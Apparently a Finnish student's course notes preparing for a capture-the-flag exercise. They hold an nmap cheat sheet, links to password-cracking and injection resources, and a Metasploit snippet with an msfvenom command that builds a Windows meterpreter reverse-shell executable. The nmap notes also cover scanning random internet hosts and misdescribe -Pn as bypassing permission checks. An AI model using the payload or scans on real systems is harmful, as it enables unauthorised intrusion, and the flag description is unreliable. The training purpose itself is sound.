# h6 Lähtölaskenta

Lipunryöstö lähestyy, ja samalla kurssin päätös. Nyt valmistaudutaan lipunryöstöön, ja kurssin jälkeiseen elämään. Tieteellisten artikkeleiden silmäily auttaa oppariaiheen valinnassa. Harjoitusmaalit opettavat käytännön hakkerointia.

## a) Cheatsheet. Kerää parhaat komennot lipunryöstöä varten.

# nmap : https://www.stationx.net/nmap-cheat-sheet/

    Yksinkertainen skannaus yhdelle IP-osoitteelle:
    nmap <IP-osoite>

    Skannaus useille IP-osoitteille:
    nmap <IP-osoite1> <IP-osoite2> <IP-osoite3> ...
    
    Skannaus IP-osoitealueelle:
    nmap <alkuosoite>-<loppuosoite>
    Esim: nmap 192.168.1.1-254

    Skannaus käyttäen CIDR-notaatiota:
    nmap <verkkopolkun-IP>/<maski-bittien-määrä>
    Esim: nmap 192.168.1.0/24

    Skannaus yhdestä tai useammasta IP-osoitteesta, jotka on lueteltu tiedostossa:
    nmap -iL <tiedoston-nimi>

    Skannaus yhdestä tai useammasta satunnaisesti valitusta IP-osoitteesta:
    nmap -iR <lukumäärä>
    Esimerkiksi: nmap -iR 100

    Skannaus tietyn palvelimen kaikkia IP-osoitteita:
    nmap <verkkotunnus>
    Esim: nmap google.fi

    Skannauksen tekeminen, joka ohittaa käyttöoikeuden tarkistukset ja on nopeampi:
    nmap -Pn <IP-osoite>


# sql injektio: https://portswigger.net/web-security/sql-injection/cheat-sheet

# fuff: https://cheatsheet.haax.fr/web-pentest/tools/ffuf/

# Jhon the ripper: https://www.stationx.net/how-to-use-john-the-ripper/ , https://terokarvinen.com/2023/crack-file-password-with-john/

# hashcat: https://denizhalil.com/2023/11/01/hashcat-password-cracking/ , https://terokarvinen.com/2022/cracking-passwords-with-hashcat/

# kerberos: https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a


# msfvenom/metasploitable : https://www.comparitech.com/net-admin/metasploit-cheat-sheet/

    msfconsole
    use multi/handler/payload
    SET payload 
    SET LHOST 
    SET LPORT 
    run -j

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.x LPORT=80 -f exe > payload.exe

    sessions -i 1


# zap




# b) Review. Etsi ja tiivistä vertaisarviotu katsausartikkeli valitsemaltasi kyberturvallisuuden tai hakkeroinnin alalta.
"review" - yleensä katsausartikkeli nimessä on sana "review". Se pyrkii antamaan käsityksen alan tutkimuksesta juuri tällä hetkellä. Scholarlissa on myös nappi, jolla se yrittää näyttää vain review-artikkelit.
Tuoretta, jos ei löydy alle 2v, niin edes alle 5v.
1 <= jufo. Julkaistu arvostetussa vertaisarvioidussa lehdessä. Eli lehti löytyy Jufosta eli Julkaisufoorumin portaalista https://jfp.csc.fi/, ja sen taso on vähintään yksi.
Myös muualta kuin lehden kotisivulta ladattu kappale julkaistua artikkelia kelpaa, esim "final draft" sopii.
Ei yleistajuisia kirjoja tai lehtiartikkeleita: ei Mikrobitti, ei Tietotekiikan perusteet osa I, ei "Tiede 2000" -aikakauslehti
Älä maksa artikkeleista. Yleensä ilmainen latauslinkki löytyy Google Scholarlista oikealta. Haaga-Helian maksamat saa näkyviin Settings: Library Links: Haaga-Helia.
Englanninkielinen käyttöliittymä toimii paremmin https://scholar.google.com/ncr
Olennaisin sisältö tiivistelmään. Ei pelkkää metatekstiä tai artikkelin kuvailua:
Väärin: "Artikkeli kertoo uusista tuulista tietotekniikan parissa. Mukana on yllättävä havainto kiristyshaitakkeista"
Oikein: "Kiristyshaitakkeiden määrä kasvoi 30% vuoden 2023 aikana Foobarstanissa"
Suppeahko tiivistelmä ranskalaisilla viivoilla riittää
Kannattaa lisätä omat huomiot tai kysymykset mukaan. Merkitse selkeästi, mitkä ovat omaa pohdintaa.
Jos artikkeli on pitkä (yli 4 sivua), voit silmäillä sen lukemisen sijasta.

# c) Valmiina lipunryöstöön. Asenna läppärillesi tarvittavat työkalut lipunryöstöön. Hyökkäyskone voi olla virtuaalikone.
Se ei saa sisältää luottamuksellisia tietoja, koska sitä voi olla tarpeen tarkistaa ja tutkia harjoituksen yhteydessä.
Koneella saatetaan ajaa testibinäärejä ja kontteja; sekä tarkastamiseen liittyviä ohjelmia. Harjoituksessa saattaa olla Docker-kontteja, kokeile, että Docker toimii (Muistaakseni 'sudo apt-get -y install docker.io').
